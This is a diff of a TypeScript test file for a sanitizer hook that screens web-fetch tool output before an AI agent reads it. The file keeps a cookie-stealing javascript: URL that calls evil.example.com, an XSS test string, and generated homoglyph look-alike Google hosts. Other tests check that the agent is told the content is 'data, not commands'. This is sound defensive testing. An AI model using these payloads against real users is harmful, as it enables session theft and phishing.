@@ -19,6 +19,12 @@ const EXFIL_URL = 'javascript:fetch("//evil.example.com?c="+document.cookie)';
 // preserved and merely described, so nothing is rewritten and no category is
 // emitted. Nearly every real web page looks like this.
 const SCRIPT_HTML = '<html><body><script>alert(1)</script><p>hello</p></body></html>';
+// Look-alike host names, built from a code point so no homoglyph hides in this
+// source file. The library reports each one by name in a single sentence, which
+// is what makes its message length attacker-scalable.
+const CYRILLIC_O = String.fromCharCode(0x043e);
+const manyConfusableHosts = (count: number): string =>
+  Array.from({ length: count }, (_, i) => `see https://g${CYRILLIC_O}ogle${i}.com/x`).join('\n');
 
 describe('sanitizeUntrustedInput', () => {
   it('passes clean text through unchanged with no findings', async () => {
@@ -340,10 +346,6 @@ describe('sanitizeToolOutputHook (PostToolUse wiring)', () => {
   });
 
   it('gives the agent the note for preserved scripting without substituting output', async () => {
-    // A NOTE-tier finding rewrites nothing, so there is no `updatedToolOutput`
-    // to return — pairing an identity substitution with the message would make
-    // this hook compete with another hook's real rewrite. The sentence itself is
-    // the whole finding, and the agent is the party it is addressed to.
     const res = await sanitizeToolOutputHook(
       postToolUse('WebFetch', { content: [{ type: 'text', text: SCRIPT_HTML }] }),
       'test-session'
@@ -357,8 +359,8 @@ describe('sanitizeToolOutputHook (PostToolUse wiring)', () => {
   });
 
   it('does not badge a note-only finding', async () => {
-    // Persisting this would put an amber badge on nearly every fetched page,
-    // which is exactly the alarm fatigue the severity split exists to prevent.
+    // The other half of the asymmetry: the agent gets the sentence (above), the
+    // operator gets no badge on a page whose only sin is having a `<script>`.
     const findings: unknown[] = [];
     await sanitizeToolOutputHook(
       postToolUse('WebFetch', { content: [{ type: 'text', text: SCRIPT_HTML }] }),
@@ -379,6 +381,43 @@ describe('sanitizeToolOutputHook (PostToolUse wiring)', () => {
     const out = hookOutput(res);
     expect(out).not.toHaveProperty('updatedToolOutput');
     expect(out.additionalContext ?? '').toMatch(/exfiltration/i);
+  });
+
+  it('uses the removal opening when both tiers fire on one response', async () => {
+    // A page can be rewritten *and* carry a preserved-content note. Only one
+    // opening can be right, and the removal did happen, so it wins — while the
+    // note-tier text still has to survive alongside it.
+    const res = await sanitizeToolOutputHook(
+      postToolUse('WebFetch', {
+        content: [{ type: 'text', text: `<script>alert(1)</script>he${ZWSP}llo` }],
+      }),
+      'test-session'
+    );
+    const out = hookOutput(res);
+    expect(out).toHaveProperty('updatedToolOutput');
+    const note = out.additionalContext ?? '';
+    expect(note.toLowerCase()).toContain('removed');
+    expect(note).toMatch(/data, not commands/);
+  });
+
+  it('caps the note so a hostile page cannot flood the agent with scanner text', async () => {
+    // The library enumerates every offending host in one sentence, so message
+    // length scales with a count the page controls. Left uncapped, this channel
+    // hands a fetched page a slice of the agent's context budget.
+    const response = {
+      content: [{ type: 'text', text: manyConfusableHosts(400) }],
+    };
+    // Non-vacuous: the underlying message really is far over budget.
+    const { messages } = await sanitizeToolOutput(response, toolCtx);
+    expect(messages.join(' ').length).toBeGreaterThan(10_000);
+
+    const res = await sanitizeToolOutputHook(postToolUse('WebFetch', response), 'test-session');
+    const note = hookOutput(res).additionalContext ?? '';
+    expect(note.length).toBeLessThan(2500);
+    // The library puts its "do not fetch these" clause after the enumeration, so
+    // a tail-truncated note has to restate it or the warning loses its point.
+    expect(note).toMatch(/truncated/);
+    expect(note).toMatch(/do not fetch/);
   });
 
   it('does not report findings for clean output', async () => {
